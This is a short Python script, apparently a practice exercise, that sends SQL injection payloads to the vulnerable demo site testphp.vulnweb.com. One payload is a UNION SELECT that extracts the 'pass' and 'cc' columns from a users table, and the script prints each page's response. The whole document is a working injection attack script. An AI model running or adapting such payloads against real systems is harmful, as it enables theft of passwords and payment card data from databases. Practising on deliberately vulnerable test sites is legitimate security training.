import html2text
import requests
inyeccionesql = ['-1 UNION SELECT 1,2,3','-1 UNION SELECT 1,pass,cc FROM users WHERE uname="test"']
urlatacada = 'http://testphp.vulnweb.com/artists.php'
respuestas = []
i = 0
for inyeccion in inyeccionesql:
	data = {'artist':inyeccion}
	resultado = requests.get(urlatacada, data)
	respuestas.append(resultado.text)
	print(resultado.status_code)
	print("La inyeccion numero " + str(i) + " da como resultado: ")
	print(html2text.html2text(respuestas[i]))
	i = i + 1
